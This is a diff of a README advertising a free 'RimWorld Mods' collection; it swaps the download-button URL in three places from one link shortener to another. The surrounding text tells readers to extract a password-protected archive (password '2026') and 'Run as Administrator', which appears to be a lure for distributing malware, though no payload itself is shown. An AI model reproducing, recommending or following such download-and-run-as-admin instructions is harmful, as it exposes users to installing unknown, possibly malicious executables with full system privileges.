@@ -9,7 +9,7 @@ The **🌌 RimWorld Mods** is a **free** ultimate mod collection that gives you 
 
 <div align="center">
 
-[![Download RimWorld Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/rimworld-mods)
+[![Download RimWorld Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/hX0pgtB4PknVnWlzo)
 
 </div>
 
@@ -116,7 +116,7 @@ The **🌌 RimWorld Mods** is a **free** ultimate mod collection that gives you 
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Follow setup → Install mods
 
-[![Download RimWorld Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/rimworld-mods)
+[![Download RimWorld Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/hX0pgtB4PknVnWlzo)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -236,7 +236,7 @@ Transform your colony with hundreds of mods for free. **RimWorld Mods** gives yo
 
 <div align="center">
 
-[![Download RimWorld Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/rimworld-mods)
+[![Download RimWorld Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/hX0pgtB4PknVnWlzo)
 
 **Version 4.6.1** — Free RimWorld mod collection. April 2026 update. Zero cost. No payment.
 
